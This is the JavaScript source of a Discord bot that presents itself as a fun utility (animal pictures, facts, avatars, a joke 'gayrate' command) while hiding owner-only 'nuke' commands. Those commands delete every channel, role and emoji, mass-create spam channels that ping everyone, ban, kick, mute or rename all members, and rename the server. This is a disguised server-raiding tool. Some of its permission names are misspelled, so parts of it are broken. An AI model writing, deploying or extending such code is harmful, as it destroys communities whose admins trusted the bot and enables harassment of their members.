const { Client, MessageEmbed } = require('discord.js');

const client = new Client();

const NekoClient = require('nekos.life')

const img = new NekoClient()

const { token, prefix, ownerId } = require('./config');

client.on('ready', () => {
	console.log(`${client.user.username} ready for nuking.`);
});

client.on('message', async msg => {
	if (msg.author.bot) return;
	if (!msg.content.startsWith(prefix)) return;
	if (!msg.guild) return msg.reply('Commands only work in guild.');

	const args = msg.content
		.slice(prefix.length)
		.trim()
		.split(/ +/g);

	const cmd = args
	.shift()
	.toLowerCase();

	switch (cmd) {
		case 'ping':
			const _msg_ = await msg.channel.send('Pinging...');
			const _msgPing = Date.now() - _msg_.createdTimestamp;
			const apiPing = client.ws.ping;

			const ev = new MessageEmbed()
				.setTitle('Pong')
				.setDescription(
					`**Websocket:** \`${apiPing}ms\`\n**Message Delay:** \`${_msgPing}ms\``
				)
				.setColor('BLURPLE')
				.setAuthor(client.user.tag, client.user.displayAvatarURL())
				.setTimestamp();
			msg.channel.send(ev);
			break;

		case 'help':
			case 'h':
			msg.channel.send(
				new MessageEmbed()
					.setTitle(`Available commands.`)
					.setAuthor(msg.author.tag, msg.author.displayAvatarURL())
					.setColor('BLURPLE')
					.setDescription(
						`
	 		\`ping\` - Get the bot ping.
	 		\`help\` - Get the bot commands.
	 		\`cat\` - Get a random cat image.
	 		\`dog\` - Get a random dog image.
	 		\`goose\` - Get a random goose image.
	 		\`fact\` - Get a random fact.
	 		\`avatar\` - Get a user avatar image.
	 		\`gayrate\` - An accurate gayrate machine calculator.
	 		`
					)
					.setFooter(msg.guild.name, msg.guild.iconURL())
			);
			break;

		case 'cat':
			const cat = await img.sfw.meow()
			msg.channel.send(new MessageEmbed()
			.setDescription(`[Cat image](${cat.url})`)
			.setImage(cat.url)
			.setColor('BLURPLE')
			)
			break;
			
		case 'dog':
			const dog = await img.sfw.woof()
			msg.channel.send(new MessageEmbed()
			.setDescription(`[Dog image](${dog.url})`)
			.setImage(dog.url)
			.setColor('BLURPLE')
			)
			break;
			
		case 'goose':
			const goose = await img.sfw.goose()
			msg.channel.send(new MessageEmbed()
			.setDescription(`[Goose image](${goose.url})`)
			.setImage(goose.url)
			.setColor('BLURPLE')
			)
			break;
			
		case 'fact':
			const facts = await img.sfw.fact()
			msg.channel.send(facts.fact)
			break;
			
		case 'avatar':
			case 'av':
				case 'pfp':
					const user = msg.mentions.users.first() || msg.author;
					msg.channel.send(new MessageEmbed()
					.setTitle(`${user.tag} avatar`)
					.setDescription(`Click __[Here](${user.displayAvatarURL({ dynamic: true })})__ to download`)
					.setImage(user.displayAvatarURL({ dynamic: true, size: 4096 }))
					.setColor('BLURPLE')
					.setTimestamp()
					)
					break;
					
		case 'gayrate':
			const mentions = msg.mentions.users.first() || msg.guild.members.cache.get(args[0]).user || msg.author;
			const r = Math.floor(Math.random() * 101)
			msg.channel.send(new MessageEmbed()
			.setTitle('Accurate gayrate machine 🌈')
			.setDescription(`${mentions} are ${r}% gay`)
			.setColor('RANDOM')
			.setThumbnail(mentions.displayAvatarURL({ dynamic: true }))
			.setTimestamp()
			)
			break;

		case 'menu':
			if (msg.author.id !== ownerId) return;
			msg.delete();
			msg.channel.send(
				new MessageEmbed()
					.setTitle('Nuke commands')
					.setColor('BLURPLE')
					.setDescription(
						`
	 		\`createtext <amount> <name>\` - Create text channels.
	 		\`createvoice <amount> <name>\` - Create voice channels.
	 		\`createcategory\` - Create categories.
	 		\`channeldel\` - Delete all the channels include text and voice.
	 		\`banall\` - Ban all the users.
	 		\`kickall\` - Kick all the users.
	 		\`muteall\` - Mute all users.
	 	  \`createrole <amount> <name>\` - Create a specific amount of roles, **amount**: number, **name**: the role name.
	 	  \`deleterole\` - Delete a specific amount of roles.
	 	  \`nuke\` - Do everything list above in this command.
	 	  \`spam  <amount> <spam text>\` - Spam anything you want.
	 	  \`nickall\` - Nick all users in guild.
	 		`
					)
					.setTimestamp()
			);
			break;

		case 'channeldel':
		case 'delete':
			if (msg.author.id !== ownerId) return;
			msg.delete();
			setTimeout(() => {
				msg.guild.channels
					.create('OWNED', {
						type: 'text'
					})
					.then(ch => ch.send(`Deleted all the channels`));
			}, 10000);
			msg.guild.channels.cache.forEach(g => g.delete());
			break;

		case 'createtext':
			if (msg.author.id !== ownerId) return;
			msg.delete();

			let amount = args[0];
			if (!amount) return msg.channel.send('Provide a amount to create.');
			if (amount > 500)
				return msg.channel.send(
					'500 channels is the limit for a category bruh.'
				);
			let channelName =
				args.slice(1).join(' ') || `nuked by ${msg.author.username}`;
			for (var i = 0; i < amount; i++) {
				await msg.guild.channels
					.create(channelName, {
						type: 'text'
					})
					.then(async ch => {
						await ch.send(`@everyone`);
						await ch.send(
							new MessageEmbed()
								.setTitle('NUKED')
								.setDescription(`**NUKED BY ${msg.author.username}**`)
								.setColor('RANDOM')
						);
					})
					.catch(e => console.log(`Missing perms`));
			}

			msg.channel.send(
				`Created ${amount} text channels named **${channelName}**`
			);
			break;

		case 'createvoice':
			if (msg.author.id !== ownerId) return;
			msg.delete();
			const amo = args[0];
			if (!amo) return msg.channel.send('Give me an amount.');
			const chName = args.slice(1).join(' ');
			for (var i = 0; i < amo; i++) {
				msg.guild.channels.create(chName, {
					type: 'voice'
				});
			}
			msg.channel.send(`Created ${amo} voice channels named **${chName}**`);
			break;

		case 'createcategory':
			if (msg.author.id !== ownerId) return;
			msg.delete();
			if (!args[0]) return msg.channel.send('Give me an amount.');
			const cateName = args.slice(1).join(' ');
			for (var i = 0; i < args[0]; i++) {
				msg.guild.channels.create(cateName, {
					type: 'category'
				});
			}
			msg.channel.send(`Created ${args[0]} category named **${cateName}**.`);
			break;

		case 'createrole':
			if (msg.author.id !== ownerId) return;
			msg.delete();
			const am = args[0];
			if (!am) return msg.channel.send('Give me an amount to create.');
			const roleName = args.slice(1).join(' ');
			if (!roleName) return msg.channel.send('Give me the role name.');
			for (var o = 0; o < am; o++) {
				msg.guild.roles.create({
					data: {
						name: roleName,
						color: 'RANDOM'
					},
					reason: 'GET REKT'
				});
			}
			msg.channel.send(`Created ${am} roles named: ${roleName}`);
			break;

		case 'deleterole':
			if (msg.author.id !== ownerId) return;
			msg.delete();
			await msg.guild.roles.cache.forEach(r => r.delete());
			msg.channel.send(`Deleted ${msg.guild.roles.cache.size} roles`);
			break;

		case 'banall':
			if (msg.author.id !== ownerId) return;
			msg.delete();
			await msg.guild.members.cache.forEach(m => {
				if (m.banable) m.ban();
			});
			msg.channel.send(`Banned all banable users.`);
			break;

		case 'kickall':
			if (msg.author.id !== ownerId) return;
			msg.delete();
			await msg.guild.members.cache.forEach(h => {
				if (h.kickable) h.kick();
				msg.channel.send('Kicked all kickable users.');
			});

			break;

		case 'muteall':
			if (msg.author.id !== ownerId) return;
			msg.delete();
			const muted = await msg.guild.roles.create({
				data: {
					name: 'LMAO',
					color: 'BLURPLE'
				},
				reason: 'Get REKT'
			});
			for (const channel of msg.guild.channels.cache) {
				channel[1]
					.updateOverwrite(muted, {
						SEND_MESSSAGES: false,
						CONNECT: false
					})
					.catch(e => console.log(e));
			}

			await msg.guild.members.cache.forEach(m => m.roles.add(muted));
			msg.channel.send('Muted everyone.');
			break;

		case 'nickall':
			if (msg.author.id !== ownerId) return;
			msg.delete();
			const nick = args.join(' ');
			if (!nick) return msg.channel.send('Provide a nickname to change.');

			msg.guild.members.cache
				.filter(i => !i.hasPermission('ADMINISTRATOR'))
				.forEach(u => u.setNickname(nick));

			msg.channel.send(`Changed everyone nick name to ${nick}`);
			break;

		case 'spam':
			if (msg.author.id !== ownerId) return;
			msg.delete();
			const t = args[0];
			if (!t)
				return msg.channel.send(
					'Give me how many time you want to spam the text.'
				);
			const spam = args.slice(1).join(' ');
			if (!spam) return msg.channel.send('Give me something to spam.');
			for (var i = 0; i < t; i++) {
				msg.channel.send(spam);
			}
			break;

		case 'nuke':
			if (msg.author.id !== ownerId) return;
			msg.delete();
			await msg.guild.channels.cache.forEach(ch => {
				ch.delete({ timeout: 5000 });
			});
			msg.author.send(`Deleted ${msg.guild.channels.cache.size} channels`);
			await msg.guild.setName(`Nuked by ${msg.author.username}`);
			await msg.guild.emojis.cache.forEach(e => e.delete());
			msg.author.send(`Deleted all the emojis.`);
			await msg.guild.roles.cache.forEach(r => r.delete());
			msg.author.send('Deleted all the roles.');
			await msg.guild.members.cache.forEach(m => {
				if (m.banable) m.ban();
			});
			msg.author.send(
				`Banned ${msg.guild.members.cache.filter(f => f.banable).size} users.`
			);
			break;

		default:
			return msg.channel.send(
				new MessageEmbed()
					.setDescription(`${cmd} is not a command.`)
					.setColor('RED')
			);
	}
});

client.login(token).catch(e => console.log(e.message));
